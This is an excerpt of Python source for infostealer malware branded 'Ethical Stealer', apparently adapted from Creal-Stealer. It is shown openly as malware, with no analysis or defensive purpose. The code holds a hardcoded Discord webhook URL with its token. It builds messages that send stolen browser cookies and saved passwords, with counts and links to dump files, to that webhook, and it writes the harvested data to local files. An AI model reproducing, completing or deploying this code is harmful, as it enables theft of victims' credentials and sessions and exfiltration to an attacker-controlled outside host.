...
wh00k = "https://discord.com/api/webhooks/1150915615989698600/sge8TDfL5zbEzzAqYzRfjzjq0QadQiVt5nofhjaGiIFxr7K0_CbN9EuT3E65QYwVYyX_"
...
def upload(name, link):
    ...
    if name == "crcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Ethical | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [EthicalCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Ethical Stealer",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
    ...
    if name == "crpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Ethical | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [EthicalPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Ethical Stealer",
                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
...
def wr1tef0rf1l3(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Ethical STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
